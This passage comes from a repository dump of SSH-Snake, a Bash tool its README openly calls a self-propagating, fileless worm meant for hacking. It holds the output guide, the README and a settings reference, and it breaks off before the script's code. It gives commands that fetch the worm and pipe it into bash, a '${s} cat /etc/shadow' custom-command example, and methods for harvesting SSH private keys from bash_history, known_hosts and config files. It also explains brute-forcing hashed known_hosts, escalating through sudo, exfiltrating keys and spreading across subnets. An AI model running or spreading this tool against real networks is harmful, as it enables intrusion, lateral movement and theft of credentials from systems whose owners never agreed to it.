usable key and 12 destination addresses have been discovered on the system. The script will now try to connect to those 12 addresses using the 1 key.\n8. `jrogers@10.128.0.25` has connected to `jrogers@10.128.0.25` using the `/home/jrogers/.ssh/id_rsa` key. The `!` at the beginning of the key location indicates that `sudo` was used.\n9. The \"hostnames chain\" format of the above.\n10. `jrogers@10.128.0.25` has connected to `jrogers@10.128.0.27` using the `/home/jrogers/.ssh/id_rsa` key.\n11. The \"hostnames chain\" format of the above.\n12. A private key that can be used has been discovered in `/home/jrogers/.ssh/id_rsa`.\n\nAgain: each of these lines are indicative of _normal_ output.\n\n---\n\n\nThere are some exceptional cases which are related to error conditions and the [custom_cmds option](/SETTINGS.md#custom_cmds):\n\nExamples of these exception cases are listed below:\n\n```\n(1) [1704020279] jrogers@10.128.0.25[/home/jrogers/.ssh/id_rsa]->git@20.205.243.166 [GitHub]\n(2) [1704020279] jrogers@10.128.0.25[/home/jrogers/.ssh/id_rsa]->jrogers@10.128.50.50 [GitLab]\n(3) [1704020279] jrogers@10.128.0.25[/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.30 [NoLogin]\n(4) [1704020279] jrogers@10.128.0.25[/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.30 [OoM]\n(5) [1704020279] jrogers@10.128.0.25[/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.30 [ConnErr]\n(6) [1704020279] jrogers@10.128.0.25[/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.30 [fail,aws,ubuntu]\n(7) [1704020279] jrogers@10.128.0.25[/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.30 [fail,cmd,awk]\n(8) [1704020279] jrogers@10.128.0.25[/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.30 [ARGLIMIT:1048576, abcdef...]\n(9) [1704020279] jrogers@10.128.0.25[/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.30: EXTERNAL_MSG: CMD[uname]: abcdef...\"\n(10) [1704020279] jrogers@10.128.0.25[/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.30 [line]: abcdef..\n```\n\nEach of these indicate:\n\n1. The `/home/jrogers/.ssh/id_rsa` key can be used to SSH to `git@20.205.243.166`, which is a server identifying itself as GitHub.\n2. The `/home/jrogers/.ssh/id_rsa` key can be used to SSH to `jrogers@10.128.50.50`, which is a GitLab server.\n3. The `/home/jrogers/.ssh/id_rsa` key can be used to SSH to `jrogers@10.128.0.30`, but the user is restricted to `/usr/sbin/nologin` (meaning the SSH connection is likely used only for proxying).\n4. The destination `jrogers@10.128.0.30` has run of memory during script execution.\n5. The destination `jrogers@10.128.0.30` has unexpectedly disconnected.\n6. The destination `jrogers@10.128.0.30` is an AWS EC2 instance which accepts the `/home/jrogers/.ssh/id_rsa` key but does not allow SSH to the `jrogers` user: instead, you must SSH to the `ubuntu` user. If the [retry_count option](SETTINGS.md#retry_count) is greater than 0, the script will automatically attempt to SSH to `ubuntu@10.128.0.30`.\n7. The destination `jrogers@10.128.0.30` accepts the key but the script cannot run because the `awk` program is not installed on the system.\n8. Either `jrogers@10.128.0.25` or `jrogers@10.128.0.30` has experienced a fatal error: [the argument limit length](https://unix.stackexchange.com/questions/120642/what-defines-the-maximum-size-for-a-command-single-argument) has been reached, which means that the script cannot be passed via an argument. The argument limit is `1048576`. The so-called `ignore_list` (containing all of the destinations already scanned and currently being scanned) is also printed in base64 format.\n9. The custom command `uname` has been run on `jrogers@10.128.0.30` due to it being set in the `custom_cmds` option, and the output of the command (including stderr) is printed in base64 format.\n10.  The destination `jrogers@10.128.0.30` has printed an unexpected output. The output is printed after `[line]: `. Alternatively, it may also mean that `ssh` on `jrogers@10.128.0.25` has printed an unexpected output while using `ssh -i key jrogers@10.128.0.30`.\n\n---\n\nA few more procedural lines are also printed:\n\n```\n(1) [1702897342] jrogers@10.128.0.30: EXTERNAL_MSG: INFO: Trying again with 2 dests and 4 keys (attempts left: 0)\n(2) 12 destinations (from 10 unique servers) added to interesting_dests.\n(3) Unique private keys discovered: 8\n(4) Unique shell accounts accessed: 10\n(5) Unique servers accessed: 5\n```\n\n1. Either 2 recoverable errors have been encountered such that the destinations where the errors occurs will be tried again, or the [use_find_from_ignore_list option](SETTINGS.md#use_find_from_ignore_list) has been enabled and the script is attempting to SSH into any destinations from the ignore list (and thus the new destinations are being tried).\n2. The [use_retry_all_dests options](SETTINGS.md#use_retry_all_dests) has been enabled and the script is going to re-run the scan completely with 12 destinations, corresponding to 10 unique systems (user1@host and user2@host are one system).\n3. At the complete end of the scan, this identifies the total amount of private keys discovered during the scan.\n4. At the complete end of the scan, this identifies the total amount of destinations (`user@host`) that have been accessed.\n5. At the complete end of the scan, this identifies the total amount of systems (based on the hostnames chain format) that have been accessed.\n"
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 10.125,
          "content": "\n# SSH-Snake: Automated SSH-Based Network Traversal\n\n🐍 SSH-Snake is a powerful tool designed to perform automatic network traversal using SSH private keys discovered on systems, with the objective of creating a comprehensive map of a network and its dependencies, identifying to what extent a network can be compromised using SSH and SSH private keys starting from a particular system.\n\nSSH-Snake can automatically reveal the relationship between systems which are connected via SSH, which would normally take a tremendous amount of time and effort to perform manually.\n\nIn other words, SSH-Snake performs the following tasks automatically and recursively:\n\n1. On the current system, find any SSH private keys,\n2. On the current system, find any hosts or destinations (`user@host`) that the private keys may be accepted,\n3. Attempt to SSH into all of the destinations using all of the private keys discovered,\n4. If a destination is successfully connected to, repeats steps #1 - #4 on the connected-to system.\n\nIt's completely self-replicating and self-propagating -- and completely fileless. In many ways, SSH-Snake is actually a [worm](https://en.wikipedia.org/wiki/Computer_worm): It replicates itself and spreads itself from one system to another as far as it can.\n\nInstead of manually jumping between systems with SSH keys like it's a Super Mario game, let SSH-Snake do the work for you.\n\nAlthough this tool is intended for hacking purposes, sysadmins can also use it to better understand their infrastructure and network. If you want to disable the printing of private keys discovered, [comment out this line of code](https://github.com/MegaManSec/SSH-Snake/blob/7ae7ef0afe0e067a1b96f69e508df52831a08b8b/Snake.sh#L964).\n\nAn in-depth look at how this script actually works, technical details, interesting discoveries, design decisions, benchmarking, and lessons learnt, check out [this blog post](https://joshua.hu/ssh-snake-ssh-network-traversal-discover-ssh-private-keys-network-graph).\n\n# Screenshots\n\n\n\n|![](tools/SSH-Snake-Screenshot.png)A reduced screenshot from the output of SSH-Snake in a very small network.|\n|:-:|\n\n---\n\n|![A graph visualizing the relation between systems using SSH](tools/SSH-Snake-CytoScape.svg)The blue nodes indicate the _destination_ can connect to itself (user@host<-->user@host). The red edges indicate that the connection is bi-directional (user1@host1<-->user2@host2).|\n|:-:|\n\n---\n\n\n|![A graph visualizing the relation between systems using SSH](tools/SSH-Snake-Gephi.svg)The green nodes indicate a _host_ (without a username) that can connect to itself (host1<-->host1). The green edges indicate that the connection is bi-directional (host1<-->host2). The gray host in the top right corner is the host that the script was initially executed on.|\n|:-:|\n\n---\n\n|![A graph visualizing the relation between systems using SSH](tools/SSH-Snake-dot-circo.png)The blue nodes indicate the _destination_ can connect to itself (user@host<-->user@host). The red edges indicate that the connection is bi-directional (user1@host1<-->user2@host2).|\n|:-:|\n\n\n# Using and Running SSH-Snake\n\nSSH-Snake can either be downloaded or piped into bash:\n\n```bash\nwget https://raw.githubusercontent.com/MegaManSec/SSH-Snake/main/Snake.nocomments.sh\nbash ./Snake.nocomments.sh\n```\n\nor\n\n```bash\ncurl https://raw.githubusercontent.com/MegaManSec/SSH-Snake/main/Snake.nocomments.sh | bash\n```\n\n# About SSH-Snake\n\nSSH-Snake seamlessly emulates what a human adversary would do to discover SSH private keys and destinations where they can be used to connect to. Written entirely in Bash, it operates with a minimal set of dependencies commonly available on major Linux (and MacOS) systems: `bash`, `ssh`, `coreutils`, `awk`, `uniq`, `sort`, `grep`, `tr`, `find`, and `cat`. `getent` OR `dscacheutil` is required. `sed` is required for only the very first system. Likewise, `sudo`, `hostname`, `ip`, `timeout`, `arp`, `ifconfig`, `ipconfig`, and `xargs` may also be used, but they are not required (and the script gracefully handles cases where they are not present). If a system is discovered without any of the required packages, it gracefully fails, alerting the user that the scan could not continue on that particular system (and backtracks, continuing from the previous system.)\n\nSSH-Snake is completely fileless: after the user runs the script, it is passed to destinations' bash via stdin and bash arguments (via SSH). No material evidence of the script exists on any of the systems scanned: the only evidence of the script running is in the process tree, and the substantial amount of invalid SSH attempts which will inevitably occur.\n\nSSH-Snake takes a [depth-first approach](https://en.wikipedia.org/wiki/Depth-first_search) to discovery: once it connects to one system, it tries to connect further from that system before backtracking.\n\nThe name SSH-Snake comes from the fact that the output of the script looks like a snake slithering up and down the network. However unlike the game Snake, SSH-Snake will not die when it bites its own tail (connects to a systems it has already scanned or is currently scanning): it will simply print how it connected there as normal, but return and not re-scan the destination (in order to avoid infinite recursion).\n\nSSH-Snake has been tested on various flavors of Linux, and MacOS (with Homebrew Bash installed). If you encounter a Linux-based OS it isn't compatible with, please submit a report.\n\n# Features\n\n- Recursively SSH from one system to another using local SSH private keys,\n- Fileless traversal and propogation/replication of the SSH-Snake script using only stdin and bash arguments to remote systems,\n- Automatic elevation of privileges to root using sudo if possible,\n- Discover SSH private key files from `.bash_history` entries,\n- Discover SSH private keys from commonly used files and folders,\n- Exfiltration SSH private keys as output of the script,\n- Configurable custom command execution on each system,\n- Plug-and-play modular system to discover private keys and systems,\n- Detect hosts from IP ranges, last logins, known hosts, SSH config files, and more,\n- Ability to detect when a system has already been scanned or is in the process of being scanned such that a network like A->B->C is able to also discover C->A but does not regress to A->B->C-A->B->C->A->B->....,\n- Ability to generate graphical visulizations of a network from the output of the script,\n- ... and more.\n\n# Settings\n\nSSH-Snake comes with some general settings that can be configured. These settings are documented in [SETTINGS.md#general-settings](SETTINGS.md#general-settings).\n\nSSH-Snake also comes with a variety configurable/plug-and-play strategies (functions) which can be used to discover SSH private keys on a system and discover hosts and destinations to attempt to connect to. Sane defaults have been provided, however if you want to perform a scan as thoroughly as possible, then enabling more discovery techniques can help. If a scan is taking a long time, disabling some discovery techniques can help. With the exception of one strategy (`find_ssh_keys`), each of the strategies can be toggled off/on. These are documented in [SETTINGS.md#configurable-discovery-strategies](SETTINGS.md#configurable-discovery-strategies).\n\n# Understanding Output\n\nThe raw output of SSH-Snake contains a mix of infomation about discovered private keys, destinations, and error messages.\n\nA detailed explanation on the full output of SSH-Snake can be found in [OUTPUT.md](OUTPUT.md).\n\nAn example of an output can be found in [example-output.log](/example-output.log).\n\n# Visualizing System Relationships\n\nThe output of SSH-Snake can be used to create graphs/visualizations of the network that the script traverses.\n\nA detailed explanation on how to create and interpret images/visualizations from the output of SSH-Snake can be found in [GRAPHICS.md](GRAPHICS.md).\n\n# Other Tools\n\nIn addition to the ability to create visualizations of the network that SSH-Snake traverses, three other tools are provided. Namely:\n\n1. `forward-lookup-host.py`: Given a source host or destination, determine all of the systems that can be accessed either directly or indirectly (i.e. through a tertiary system).\n2. `reverse-lookup-host.py`: Given a destination host or destination, determine all of the systems that can either directly or indirectly access it.\n3. `shortest-path-create-chain.py`: Given host or destination A and B, determine the shortest path connecting the two.\n\nThe third tool also generates a command that can be used to connect from destination A to destination B. For example:\n\n```\n$ python3 tools/shortest-path-create-chain.py --file output.log --src 'jrogers@10.2.3.4' --dest 'root@10.25.49.1'\n\nShortest path from jrogers@10.2.3.4 to root@10.25.49.1: jrogers@10.2.3.4->user@10.44.39.21->user@10.19.29.54->root@10.25.49.1\n\n[..]\n\nssh -i \"/home/jrogers/.ssh/key\" user@10.44.39.21 'sudo ssh -i \"/root/.ssh/id_rsa\" user@10.19.29.54 'ssh -i \"/tmp/key\" root@10.25.49.1''\n```\n\n# Snake.sh vs Snake.nocomments.sh\n\nSince the script is quite large, loading the script into a here-document (which it does automatically because the script it actually [a Quine](https://en.wikipedia.org/wiki/Quine_(computing))) [causes bash to write to a temporary file](https://joshua.hu/more-fun-with-bash-ssh-and-ssh-keygen-version-differences) (as it is greater than 65535-bytes).\n\nTo cut down on the size such that it remains 100% fileless, Snake.nocomments.sh has a version with all comments, unnecessary white-spaces, and blank lines removed. This cuts the file's size down such that the temporary file is not created by bash.\n\n# Bugs / Issues\n\nIf you encounter any bugs or issues related to the script, please report them as a GitHub issue. Please include your configuration setings.\n\nI am particually interested in any interesting `[line]` outputs associated with errors that haven't been caught by the script.\n\n# Limitations\n\n- IPv4 Only: Like all of the best programs, the script does not support IPv6. I can't imagine there will be support for this anytime soon.\n\n- Port 22 Only: There is a general assumption that SSH is running on port 22.\n\n- GNU coreutils: The script relies heavily on GNU coreutils. I have not determined how much (if any) GNU-ism is used in the script.\n\n- The script does not currently look for SSH agent sockets.\n"
        },
        {
          "name": "SETTINGS.md",
          "type": "blob",
          "size": 19.9609375,
          "content": "# General Settings\n\n### ignore_user\nDefault: 0.\n\nIf set to 1, the script will consider a system already scanned when one user has been accessed. For example, if `user1@host` has been scanned and the script makes its way to `user2@host` somehow, a repeated scan will not occur. This may be useful in an environment where sudo is accessible by every user (because `user1@host` can already access the keys that `user2@host` can access).\n\n## use_sudo\n\nDefault: 1\n\nIf set to 1, the script will attempt to use `sudo` to elevate its privileges. If it is successful, the script runs as root; if it isn't, the script runs as the normal user.\n\n## ssh_timeout\n\nDefault: 3\n\nThe connection timeout (in seconds) for SSH connections __and DNS resolution__. See `ssh_config(5)`'s _ConnectTimeout_.\n\n## retry_count\n\nDefault: 3\n\nIn some cases, a __recoverable__ error may be encountered while using SSH. This number corresponds to the maximum amount of times a destination with a recoverable error should be tried again. It is advised to be at least 1.\n\n## ignored_users\n\nDefault: ()\n\nA list of usernames that are always ignored when attempting to SSH to another system. For example, if \"root\" is ignored, there will be no attempts to SSH into the root user of any host.\n\n## ignored_hosts\n\nDefault: ()\n\nA list of hosts (ip addresses or hostnames) that are always ignored/skipped when attempting to SSH to another system. It is generally safest to specify the hostname in ip address form.\n\n\n## ignored_dests\n\nDefault: ()\n\nA list of destinations in the form of `username@hostname` that are always ignored. It is generally safest to specify the hostname in ip address form.\n\n## ignored_key_files\n\nDefault: (\"\\*badcert.pem\\*\" \"\\*badkey.pem\\*\")\n\nA list of locations that are ignored when searching for SSH private keys. This setting supports globbing/wildcards using the standard asterisk as in any other bash script. For example, to reject just the filename \"file.name\", you would include \"\\*/file.name\" in the list. Also note that for example, \"/dir/\\*/file\" will also match \"/dir/dir2/dir3/file\".\n\n## custom_cmds\n\nDefault: ()\n\nA list of commands that should be run when the script has been initialized on each system. The output of these commands are printed as base64 strings (including stderr). Note: these commands will only ever run once as they are executed right after checking that the system has not already been scanned.\n\nThis list also supports sudo (if available), and can be used by using `${s}` as a literal. For example, `custom_cmds=('${s} cat /etc/shadow')`. If `${s}` is not specified, the command will __not__ run as sudo even if `use_sudo=1`.\n\n---\n\n\n# Configurable Discovery Strategies\n\nSSH-Snake comes with various configurable strategies (functions) which can be used to discover SSH private keys on a system and discover hosts and destinations to attempt to connect to. Sane defaults have been provided, however if you want to perform a scan as thoroughly as possible, then enabling more discovery techniques can help. With the exception of one strategy (`find_ssh_keys`), each of these strategies can be toggled off/on. Below are details of each of the strategies.\n\nDetailed technical explanations of how some of these strategies work can be found in [this blog post](https://joshua.hu/ssh-snake-ssh-network-traversal-discover-ssh-private-keys-network-graph).\n\n## SSH Private Key Discovery Strategies\n\nThe following strategies are used to discover any private keys on the system. We use these strategies over, say, checking every single file on the system, because it would be prohibitively expensive to open and parse every file on the system. Instead, the following strategies can be used to provide hints towards the location of private keys.\n\n### find_ssh_keys\n\nChecks every readable file within the `.ssh/` folder in every home folder of the system (identified using `getent passwd` and `/home/*/`. This strategy is not optional.\n\n### scan_paths / scan_paths_depth\n\nUsing the `scan_paths` and `scan_paths_depth` user-setting, the script uses `find(1)` to search each of the locations specified by `scan_paths` for keys. A maximum depth for searching directories is specified using `scan_paths_depth` (equivalent to `find $location -maxdepth $scan_paths_depth`). Multiple locations may be specified.\n\nFor example, `scan_paths=(\"/root/\" \"/var/*/\")` and `scan_paths_depth=3` will look for look for keys in `/root/*/*/*` and `/var/*/*/*/*`.\n\nIf `scan_paths` is left empty (`scan_paths=()`) or `scan_paths_depth` is less than 1, this strategy does nothing. The default value is () and 3 respectively.\n\n## SSH Host Discovery Strategies\n\nThe following strategies are used to discover potential _hosts_ which the script will SSH to. _Hosts_ correspond to either a hostname or an ip address: they do not constitute a destination that SSH will use in of itself, since SSH is missing a username that corresponds to the host.\n\nSince hosts do not correspond to destinations, it is necessary for hosts to somehow be combined with usernames to actually be useful. Therefore, all \"host discovery strategies\" are disabled unless either:\n\n1. `use_combinate_interesting_users_hosts` is enabled and there is at least one entry in _interesting_users_,\n2. `use_combinate_users_hosts_aggressive` is enabled.\n\n`use_combinate_interesting_users_hosts` will combine all of the _interesting_users_ with all of the hosts discovered to create destinations, and `use_combinate_users_hosts_aggressive` will combine all users discovered with all of the hosts discovered to creation destinations. That process is described in [combinatorial_destination_discovery_strategies](#combinatorial-destination-discovery-strategies).\n\n### use_find_from_hosts\n\nBy parsing `/etc/hosts` (or more correctly, running `getent ahostsv4`), extra hosts may be discovered.\n\nThis strategy may be toggled off/on with 0/1. The default value is 1.\n\n### use_find_arp_neighbours\n\nThis function adds all of the neighbour hosts from the arp table to the list of hosts.\n\nThis strategy may be toggled off/on with 0/1. The default value is 1.\n\n### use_find_d_block\n\nThis function takes the current host's address(es) and adds the all d-block addresses into the list of hosts. For example, if the current host has the address 10.0.0.5, this function will add the 10.0.0.0-10.0.0.255 hosts. \n\nThis strategy may be toggled off/on with 0/1. The default value is 0.\n\n## SSH Destination Discovery Strategies\n\nIn the context of this script, a \"destination\" (or \"dest\") means a username and host combination; the destination that `ssh` will attempt to connect to (`ssh user@host`). Without destinations, there is nowhere for the script to attempt to SSH to. These strategies are used to discover potential destinations that will be SSH'd to.\n\nNote that for each of these destinations, the username is also loaded into a collection of usernames, and the hosts are loaded into a collection of hosts. If `use_combinate_users_hosts_aggressive` or `use_combinate_interesting_users_hosts` are enabled, they will use these usernames and hosts to create destinations.\n \n### use_find_from_authorized_keys\n\n `authorized_keys` files may include ip-based restrictions for key usage such as `from=\"10.0.0.1,10.2.3.3\" ssh-rsa ...`. \n\nThis strategy adds any hosts discovered in the `from` directive of `authorized_keys` file to our list of destinations using `$user@$host`, where `$user` is the username corresponding to the location where the `authorized_keys` file was found.\n\nThis strategy may be toggled off/on with 0/1. The default value is 1.\n\n### use_find_from_last\n\nThis strategy checks the last logins to the system by using `last`, and extracts the addresses the logins came from. The strategy then naively assumes that the destination username of that SSH access also corresponds to the source username, adding the `$destination_username@$source_address` to the list of destinations.\n\nThis strategy may be toggled off/on with 0/1. The default value is 1.\n\n### use_find_from_prev_dest\n\nThis strategy takes the destination that we are connecting _from_ and adds it to the list of destinations.\n\nFor example, consider the chain `user@system_a->user@system_b->user@system_c`. Using this strategy, `user@system_b` will try to connect to `user@system_a`. `user@system_c` will then try to connect to `user@system_b`.\n\nThis strategy may be toggled off/on with 0/1. The default value is 1.\n\n### use_find_from_known_hosts\n\n`known_hosts` files contain a list of the hosts a user has previously SSH'd into, and can be a wealth of knowledge for discovering hosts. For example: `# 2048 MD5:32:41:b4:e7:3e:d7:ee:a4:3a:c3:a8:44:40:45:16:04 10.0.0.1 (RSA)`. \n\nThis function extracts the `10.0.0.1` host. Likewise, we add `$user@$host` to the list of destinations, where `$user` is the username corresponding to the location where the `known_hosts` file was found.\n\nIncidentally, this function also extracts users, hosts, and destinations from `authorized_keys` files which _may_ share a similar format like `# 2048 MD5:62:38:9a:f0:6d:e7:57:57:25:09:71:4d:c7:bb:4b:b0 root@system (RSA)`. This function will extract `root@system`.\n\nThis strategy may be toggled off/on with 0/1. The default value is 1.\n\n### use_find_from_hashed_known_hosts\n\n`known_hosts` files contain a list of hosts that a user has previously connected to with SSH. However, SSH offers an option _HashKnownHosts_ which is used to hash the entries of the hosts in this file such that they cannot easily be read. This is the default on most Debian-based operating systems.\n\nFor example, a user that has has _HashKnownHosts_ enabled when running `ssh 192.168.1.1` will have an entry in their `known_hosts` file similar to this: `|1|e77JRypO4qWElXpIaBGiFLOJBXg=|HBu6N6IGFeOz5wt0HFXz9/hp/wY= ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIClRF2LjL1EJNfEYAKpr9rENgZVFlH7jtEPla0x3hakB`\n\nHere, `|1|e77JRypO4qWElXpIaBGiFLOJBXg=|HBu6N6IGFeOz5wt0HFXz9/hp/wY=` corresponds to a hash of the host `192.168.1.1`. Hashing is a one-way procedure, however it is possible to brute-force this hash using `ssh-keygen`:\n\n```\n$ ssh-keygen -F 192.168.1.1\n# Host 192.168.1.1 found: line 58 \n|1|96KUSpeaZrkYrbQhhjFLF/jJ15w=|xMX7qNROy8SwPZK1zEjrlEeYU24= ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIClRF2LjL1EJNfEYAKpr9rENgZVFlH7jtEPla0x3hakB\n```\n\nWhen `use_find_from_hashed_known_hosts` is enabled, we attempt to brute-force all of the ip addresses of the c and d blocks of the current system. For example, if we are currently on `user@85.82.81.80` and we discover hashed known hosts, we will attempt to discover them by checking whether the hash corresponds to any of the hosts `85.82.0.0-85.82.255.255`. If any of the hashes are cracked, we add `$user@$host` to the list of destinations, where `$user` is the username corresponding to the location where the `known_hosts` file was found.\n\nNote that this strategy is _extremely_ slow and for each `known_hosts` file may take many minutes. Some performance testing yielded the following time taken per `known_hosts` file:\n```\n# xargs available: 2m42.820s\n# no xargs available: 7m52.145s\n# xargs available using sudo: 3m56.659s\n# no args available using sudo for-loop: 15m36.738s\n```\n\nUnlike the rest of the script, if `use_sudo` is enabled, sudo will not actually be used unless it is completely necessary (i.e. the `known_hosts` file cannot be read by the current user).\n\nThis strategy may be toggled off/on with 0/1. The default value is 0.\n\n### use_find_from_ignore_list\n\nAt any point in time, the so-called \"ignore list\" contains a list of destinations which have previously been successfully accessed and scanned. This strategy takes this list and adds all of those destinations to the list of destinations to connect to. There are two different ways this strategy can be used.\n\nWhen `use_find_from_ignore_list=1`, the script will parse the ignore list when the script _starts_ and connect to any destinations which have _previously_ been connected to.\n\nWhen `use_find_from_ignore_list=2`, the script will do the same as above, but also parse the ignore list when the script _finishes_, re-trying with any newly added destinations on the ignore list. \n\n`use_find_from_ignore_list=0` disables this function completely. The default value is 0.\n\n\n### use_retry_all_dests\n\nThe 2nd option from the `use_find_from_ignore_list` strategy is slightly flawed. Consider the following:\n\n```\nA->B->C ; Normal scan\nA->D->C ; A->D discovered naturally, D->C discovered using use_find_from_ignore_list=1 or use_find_from_ignore_list=2.\nA->C ; A->C discovered using use_find_from_ignore_list=2.\n```\n\nIt is possible that C->D could also exist. However, this link will not be discovered because destination D was first discovered after C. Since C has already been scanned, the script will not scan it again, losing the valuable data of C->D.\n\nIn order to discover every possible combination of connected systems, `use_retry_all_hosts` takes a different approach. Once the whole scan is completely finished (i.e. the script the user is running), the scan simply repeats itself but adds all of the previously discovered destinations to `interesting_dests`, ensuring that every single destination will try every other destination.\n\nOn the re-run, we do NOT attempt to discover any NEW users/hosts/destinations, only discover keys. This means that although new chains may be discovered, no new destinations will be discovered. In fact, the function to add new users, hosts, and destinations is noop'd during the re-run, so it is not possible for new destinations to be discovered at all.\n\nThis strategy may be toggled off/on with 0/1. The default value is 1.\n\n\n## Both SSH Private Key and Destination Discovery Strategies\n\nSome of these strategies can be used to find both private keys and destinations. Both of these strategies are generally advised to be kept enabled, as they are the most natural resource for finding how SSH has been used on the system (and therefore where we can find keys and where they connect to easily).\n\n### use_find_from_bash_history\n\n`.bash_history` files are a jackpot/wealth of information when it comes to SSH private keys and especially destinations. By parsing `.bash_history` files, we can see exactly how users are utilizing the `ssh`, `scp`, and `rsync` binaries, and determine where they have been connecting to and with which keys.\n\nParsing each bash_history line, we look at all calls to `ssh`, `scp`, and `rsync` and extract the following:\n\n1. Usernames,\n2. Hosts,\n3. Destinations,\n4. Key Files.\n\nFor `ssh`, `scp`, and `rsync`, we extract any destinations in the form `user@host`.\n\nFor `ssh` and `scp` specifically, we parse and extract:\n\n1. The location of any key files which have been passed with the `-i` parameter: `-i /absolute/key_file`, `-i ~/expanded/key_file`, or `-i relative/key_file`. In the middle case, we expand the `~` to the home directory of the user corresponding to where the `.bash_history` file was found. In the latter case, we also assume the location corresponds to the relative location based on the home directory of the user corresponding to the `.bash_history file`. Likewise, all cases `-i/absolute/key_file`, `-i~/expanded/key_file`, and `-irelative/key_file` are also extracted.\n2. Any username of any remote destinations that have been passed with the `-l` parameter (see `man(1)`).\n3. Any hosts of any remote destination\n4. Any destinations.\n\nFor example, this strategy is able to extract the following (_note: this list is not exhaustive and these are just some examples. the `use_find_from_bash_history` function is complicated and can hopefully handle all legitimate usage of ssh and scp_):\n```\nssh user@host ; extract user@host as a destination\nscp file user@host:~/ ; extract user@host as a destination \nscp user@host:~/file ./ ; extract user@host as a destination\nrsync -a * user@host:~/ ; extract user@host as a destination \nscp file host:~/ ; extract host, and assume $user@host as a destination\nscp host:~/file ./ ; extract host, and assume $user@host as a destination\nssh -i.ssh/id_rsa host ; extract .ssh/id_rsa and host, assume $user@host as a destination\nssh -i .ssh/id_rsa host ; extract .ssh/id_rsa and host, assume $user@host as a destination\nssh -luser host ; extract user, extract user@host as a destination\nssh -i /tmp/key host -luser ps ; extract /tmp/key and user@host as a destination\nssh host -v 'bash -c ls' ; extract host, assume $user@host as a destination\nsssh -D 9000 localhost -luser ; extract user@localhost as a destination\nssh -i key_file -v -luser host ps ; extract key_file and extract user@host as a destination\n```\n\nThis strategy may be toggled off/on with 0/1. The default value is 1.\n\n### use_find_from_ssh_config\n\nBy parsing every readable file in`.ssh/` folders, we may encounter `ssh_config` files. These files generally look something like this:\n\n```\n Host example.com\n   Hostname example.com\n   User your_username\n   IdentityFile ~/.ssh/id_rsa\n```\n\nWe parse this file and extract the `IdentityFile` for the location of a private key. We also extract the `Host`, `Hostname`, and `User`.\n\nUnfortunately at the moment, this function is unable to generate individual destinations as it naively parses the file line-by-line, rather than block-by-block. Future versions will be able to identify the destination that the block corresponds to.\n\nThis strategy may be toggled off/on with 0/1. The default value is 1.\n\n## Combinatorial Destination Discovery Strategies\n\nEach time a system is scanned, various individual usernames, hosts, and destinations will be discovered which can point towards other destinations. However, if usernames and hosts are discovered in a context that doesn't necessarily result in a definitive full destination being discovered, this data is effectively unused. That's where combinatorial destination discovery strategies come in. \n\n### combinate_interesting_users_hosts\n\nThis strategy takes pre-defined usernames, hosts, and destinations, and combinates them with their respective others to form destinations.\n\nAll `interesting_users` will be combined with all of the hosts that are discovered on the system to form destinations.\n\nAll `interesting_hosts` will be combined with all of the usernames that are discovered on the system to form destinations.\n\nAll `interesting_users` will be combined with all of the `interesting_hosts` to form destinations.\n\nAll `interesting_dests` will be used to form destinations, and can be used to force every system to attempt to SSH into specific destinations with every key.\n\nThis strategy may be toggled off/on with 0/1, or with empty `interesting_users=()`, `interesting_hosts=()`, `interesting_dests()` values. The default values are 1, (), (\"$USER\" \"root\"), and () respectively.\n\n\n### use_combinate_users_hosts_aggressive\n\nEvery single username discovered is combined with every single host discovered to form destinations.\n\nThis strategy will result in massive growth of attempted destinations; for example, 100 usernames discovered on a system along with 100 hosts will result in 10,000 destinations. Use this with caution.\n\nThis strategy may be toggled off/on with 0/1. The default value is 0.\n\n\n# Alternative Settings\n\nIn some parts of the world, it is common to simply look for any SSH private keys in `.ssh/` folders and try to SSH into every address in the d-block of the system which the key was found. The below settings imitate a similar strategy. That is to say, the below settings ensure that the script only looks for nearby hosts in the d-block, arp neighbours, and `/etc/hosts`, and attempts to SSH into each of those hosts with the username `root` and the username which the system started with (`$USER` evaluates to the username that has been SSH'd into on each destination).\n\n```\ninteresting_users=(\"$USER\" \"root\")\ninteresting_hosts=(\"127.0.0.1\")\ninteresting_dests=()\nuse_combinate_interesting_users_hosts=1\nuse_combinate_users_hosts_aggressive=0\nuse_retry_all_dests=1\nscan_paths_depth=3\nuse_find_from_hosts=1\nuse_find_arp_neighbours=1\nuse_find_d_block=1\nignored_key_files=(\"*badcert.pem*\" \"*badkey.pem*\")\nuse_sudo=1\nssh_timeout=3\nretry_count=3\nignore_user=0\nignored_users=()\nignored_hosts=()\nignored_dests=()\ncustom_cmds=()\nscan_paths=()\nuse_find_from_authorized_keys=0\nuse_find_from_last=0\nuse_find_from_prev_dest=0\nuse_find_from_known_hosts=0\nuse_find_from_hashed_known_hosts=0\nuse_find_from_ignore_list=0\nuse_find_from_ssh_config=0\nuse_find_from_bash_history=0\n```\n"
        },
        {
          "name": "Snake.nocomments.sh",
          "type": "blob",
          "size": 47.439453125,
